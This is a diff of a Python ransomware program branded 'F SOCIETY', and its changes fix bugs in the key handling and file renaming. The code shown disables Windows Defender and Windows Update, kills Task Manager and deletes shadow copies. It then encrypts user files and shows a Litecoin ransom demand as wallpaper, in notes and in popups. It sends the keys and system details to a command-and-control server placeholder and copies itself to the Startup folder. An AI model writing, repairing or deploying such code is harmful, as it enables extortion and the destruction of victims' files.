@@ -12,12 +12,15 @@ import winreg
 import time
 import threading
 import shutil
+import re
 
 # Configuration
 C2_SERVER = "https://your-c2-server.com/report"
 LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
 RANSOM_AMOUNT = "$250 USD in Litecoin"
 DECRYPT_KEY = "agent77"
+stored_key = None
+stored_iv = None
 
 def generate_key():
     return get_random_bytes(32)
@@ -78,11 +81,13 @@ def encrypt_directory(directory, key, iv, extensions=None):
             if ext in extensions and not file.endswith('.encrypted'):
                 if encrypt_file(file_path, key, iv):
                     count += 1
-                os.rename(file_path, file_path + '.encrypted')
+                try:
+                    os.rename(file_path, file_path + '.encrypted')
+                except:
+                    pass
     return count
 
 def decrypt_all_files(key, iv):
-    """Decrypt all .encrypted files"""
     count = 0
     for directory in get_target_directories():
         for root, dirs, files in os.walk(directory):
@@ -123,7 +128,6 @@ def disable_security():
         subprocess.run('powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"', shell=True, capture_output=True)
         subprocess.run('powershell -Command "Set-MpPreference -DisableScriptScanning $true"', shell=True, capture_output=True)
         subprocess.run('powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"', shell=True, capture_output=True)
-        
         try:
             key = winreg.HKEY_LOCAL_MACHINE
             subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
@@ -132,7 +136,6 @@ def disable_security():
             winreg.CloseKey(handle)
         except:
             pass
-        
         subprocess.run('net stop wuauserv', shell=True, capture_output=True)
         subprocess.run('sc config wuauserv start= disabled', shell=True, capture_output=True)
         subprocess.run('taskkill /f /im Taskmgr.exe 2>nul', shell=True)
@@ -162,17 +165,14 @@ def change_wallpaper():
             font = ImageFont.load_default()
             font2 = ImageFont.load_default()
             font3 = ImageFont.load_default()
-        
         text = "F SOCIETY\nYOUR FILES ARE ENCRYPTED"
         draw.text((100, 300), text, fill=(255, 0, 0), font=font)
         draw.text((100, 550), "Pay $250 in Litecoin", fill=(255, 255, 255), font=font2)
         draw.text((100, 650), "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz", fill=(0, 255, 0), font=font3)
         draw.text((100, 750), "To decrypt, run: python ransomware.py --decrypt agent77", fill=(255, 255, 0), font=font3)
-        
         wallpaper_path = os.environ['TEMP'] + '\\fsociety_wallpaper.bmp'
         img.save(wallpaper_path)
         ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, wallpaper_path, 3)
-        
         key = winreg.HKEY_CURRENT_USER
         subkey = r"Control Panel\Desktop"
         handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
@@ -211,11 +211,9 @@ python ransomware.py --decrypt agent77
             F SOCIETY - WE ARE EVERYWHERE
 =============================================================
 """
-    
     desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
     with open(desktop + '\\README_FSOCIETY.txt', 'w') as f:
         f.write(note)
-    
     for dir_path in get_target_directories():
         try:
             with open(dir_path + '\\README_FSOCIETY.txt', 'w') as f:
@@ -249,17 +247,13 @@ def show_popup():
         0x10 | 0x1)
 
 def main():
-    # Check for decrypt mode
+    global stored_key, stored_iv
     if len(sys.argv) >= 3 and sys.argv[1] == '--decrypt':
         if sys.argv[2] == DECRYPT_KEY:
-            # Reconstruct key and IV from ransom note
-            # For demo, we use stored key - in real scenario you'd extract from note
             try:
                 desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
                 with open(desktop + '\\README_FSOCIETY.txt', 'r') as f:
                     content = f.read()
-                    # Extract key and IV from note
-                    import re
                     key_match = re.search(r'Key: (\S+)', content)
                     iv_match = re.search(r'IV: (\S+)', content)
                     if key_match and iv_match:
@@ -272,9 +266,7 @@ def main():
                         sys.exit(0)
             except:
                 pass
-            
-            # Fallback: decrypt with stored key if available
-            if 'stored_key' in globals() and 'stored_iv' in globals():
+            if stored_key is not None and stored_iv is not None:
                 count = decrypt_all_files(stored_key, stored_iv)
                 ctypes.windll.user32.MessageBoxW(0, 
                     f"DECRYPTION COMPLETE!\n{count} files restored.",
@@ -285,22 +277,15 @@ def main():
                 "Invalid decryption key!",
                 "F SOCIETY", 0x10)
             sys.exit(1)
-    
-    # Encryption mode
     try:
         key = generate_key()
         iv = generate_iv()
         key_hex = base64.b64encode(key).decode()
         iv_hex = base64.b64encode(iv).decode()
-        
-        # Store for possible decryption
-        global stored_key, stored_iv
         stored_key = key
         stored_iv = iv
-        
         disable_security()
         delete_shadow_copies()
-        
         total_encrypted = 0
         for directory in get_target_directories():
             try:
@@ -308,21 +293,16 @@ def main():
                 total_encrypted += count
             except:
                 pass
-        
         change_wallpaper()
         create_ransom_note(key_hex, iv_hex)
-        
         system_info = f"{os.name} {sys.platform} {os.environ.get('COMPUTERNAME', 'Unknown')}"
         send_to_c2(key_hex, iv_hex, total_encrypted, system_info)
-        
         show_popup()
-        
         try:
             startup = os.environ.get('APPDATA', '') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
             shutil.copy2(sys.argv[0], startup + '\\fsociety_ransomware.exe')
         except:
             pass
-        
     except:
         pass
 
